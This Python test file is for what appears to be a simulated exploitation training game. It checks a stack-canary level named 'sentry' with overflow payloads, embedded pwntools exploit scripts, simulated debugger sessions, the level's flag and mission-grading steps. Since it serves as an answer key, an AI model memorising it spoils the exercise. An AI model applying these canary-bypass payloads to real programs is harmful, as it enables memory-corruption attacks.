import unittest

from omnisploit.engine.machine import load_all_levels, Process, p64
from omnisploit.engine.world import World
from omnisploit.shell.shell import Shell

CANARY = 0xBAADF000


def run(sh, line):
    out = sh.run_line(line)
    o = b"".join(d for d, e in out.chunks if not e)
    e = b"".join(d for d, e in out.chunks if e)
    return o, e


def payload(win_addr, canary=CANARY, offset=72):
    return b"A" * offset + p64(canary) + b"B" * 8 + p64(win_addr)


class CanaryEngineTests(unittest.TestCase):
    """Direct tests of the canary check against the raw engine."""

    def setUp(self):
        self.lv = load_all_levels()["sentry"]
        self.win = self.lv.function("win").addr

    def test_plain_input_is_fine(self):
        res = Process(self.lv).feed(b"hello\n")
        self.assertIsNone(res.crash)
        self.assertFalse(res.solved)

    def test_naive_overflow_aborts_before_reaching_the_return_address(self):
        res = Process(self.lv).feed(b"A" * 72 + p64(self.win) + b"\n")
        self.assertEqual(res.crash.signal, "SIGABRT")
        self.assertFalse(res.solved)

    def test_overflow_that_stops_exactly_at_the_canary_is_fine(self):
        res = Process(self.lv).feed(b"A" * 72 + b"\n")
        self.assertIsNone(res.crash)

    def test_preserving_the_canary_reaches_win(self):
        res = Process(self.lv).feed(payload(self.win) + b"\n")
        self.assertIn(b"FLAG{the_canary_sings_if_you_listen}", res.stdout)
        self.assertTrue(res.solved)

    def test_a_single_wrong_byte_in_the_canary_still_aborts(self):
        res = Process(self.lv).feed(payload(self.win, canary=CANARY ^ 1) + b"\n")
        self.assertEqual(res.crash.signal, "SIGABRT")
        self.assertFalse(res.solved)

    def test_one_byte_short_of_the_canary_also_aborts(self):
        res = Process(self.lv).feed(b"A" * 71 + p64(self.win) + b"\n")
        self.assertEqual(res.crash.signal, "SIGABRT")


class SentryLevelTests(unittest.TestCase):
    def setUp(self):
        self.sh = Shell(World())
        run(self.sh, "cd sentry")
        self.win = 0x401176

    def test_checksec_reports_a_real_canary(self):
        o, _ = run(self.sh, "checksec ./sentry")
        self.assertIn(b"Canary found", o)
        self.assertIn(b"No PIE", o)
        self.assertIn(b"NX enabled", o)

    def test_naive_ret2win_aborts(self):
        self.sh.vfs.install("/tmp/naive", payload(self.win) if False else b"A" * 72 + p64(self.win) + b"\n")
        o, e = run(self.sh, "./sentry < /tmp/naive")
        self.assertIn(b"*** stack smashing detected ***: terminated", e)
        self.assertIn(b"Aborted (core dumped)", e)
        self.assertIn("crash:sentry", self.sh.world.events)
        self.assertIn("abort:sentry", self.sh.world.events)

    def test_correct_payload_via_shell_redirect(self):
        self.sh.vfs.install("/tmp/good", payload(self.win) + b"\n")
        o, _ = run(self.sh, "./sentry < /tmp/good")
        self.assertIn(b"FLAG{the_canary_sings_if_you_listen}", o)
        self.assertIn("solved:sentry", self.sh.world.events)

    def test_r2_shows_the_canary_constant_in_the_disassembly(self):
        run(self.sh, "r2 -A ./sentry")
        o, _ = run(self.sh, "pdf @ sym.vuln")
        text = o.decode()
        self.assertIn("cmp rax, 0xbaadf000", text)
        self.assertIn("call sym.imp.__stack_chk_fail", text)
        self.assertIn("; var char *canary @ rbp-0x8", text)
        run(self.sh, "q")

    def test_gdb_can_read_the_canary_dynamically(self):
        run(self.sh, "gdb -q ./sentry")
        run(self.sh, "break *0x4011b9")  # right at the cmp
        run(self.sh, "run")
        run(self.sh, "hi")  # a short input leaves the canary untouched, unlike an overflow
        o, _ = run(self.sh, "x/gx $rbp-8")
        self.assertIn(b"baadf000", o)
        run(self.sh, "c")
        run(self.sh, "q")

    def test_gdb_shows_the_abort_when_the_canary_is_actually_smashed(self):
        run(self.sh, "gdb -q ./sentry")
        run(self.sh, "run")
        o, _ = run(self.sh, "A" * 80)  # overflows straight through the canary
        self.assertIn(b"Program received signal SIGABRT, Aborted.", o)
        self.assertIn(b"__stack_chk_fail", o)
        run(self.sh, "q")

    def test_pwn_process_exploit_script(self):
        src = (
            "from pwn import *\n"
            "context.arch = 'amd64'\n"
            "p = process('./sentry')\n"
            f"p.sendline(b'A'*72 + p64({CANARY}) + b'B'*8 + p64({self.win}))\n"
            "out = p.recvall()\n"
            "print(b'FLAG{' in out, p.poll())\n"
        )
        self.sh.vfs.install("/tmp/e.py", src)
        o, _ = run(self.sh, "python3 /tmp/e.py")
        self.assertEqual(o, b"True -11\n")


class SentryMissionTests(unittest.TestCase):
    def setUp(self):
        self.sh = Shell(World())
        run(self.sh, "mkdir ~/workspace")

    def completed(self):
        self.sh.world.missions.evaluate()
        return list(self.sh.world.missions.completed)

    def write_correct_canary(self, value="0xBAADF000"):
        run(self.sh, f"echo {value} > ~/workspace/canary-value.txt")

    def trip_the_canary(self):
        self.sh.vfs.install("/tmp/naive", b"A" * 80 + b"\n")
        run(self.sh, "~/sentry/sentry < /tmp/naive")

    def solve_it(self):
        src = (
            "from pwn import *\n"
            "context.arch = 'amd64'\n"
            "p = process('./sentry')\n"
            f"p.sendline(b'A'*72 + p64(0xBAADF000) + b'B'*8 + p64(0x401176))\n"
            "p.recvall()\n"
        )
        self.sh.vfs.install("/tmp/e.py", src)
        run(self.sh, "cd ~/sentry")
        run(self.sh, "python3 /tmp/e.py")

    def test_requires_all_three_steps(self):
        self.assertEqual(self.completed(), [])
        self.trip_the_canary()
        self.assertEqual(self.completed(), [])
        self.write_correct_canary()
        self.assertEqual(self.completed(), [])
        self.solve_it()
        self.assertEqual(self.completed(), ["sentry"])

    def test_wrong_canary_value_does_not_complete_it(self):
        self.trip_the_canary()
        self.write_correct_canary("0xBAADF001")
        self.solve_it()
        self.assertEqual(self.completed(), [])

    def test_decimal_canary_value_is_accepted(self):
        self.trip_the_canary()
        self.write_correct_canary(str(CANARY))
        self.solve_it()
        self.assertEqual(self.completed(), ["sentry"])

    def test_solving_it_alone_without_the_crash_step_is_not_enough(self):
        self.write_correct_canary()
        self.solve_it()
        self.assertEqual(self.completed(), [])
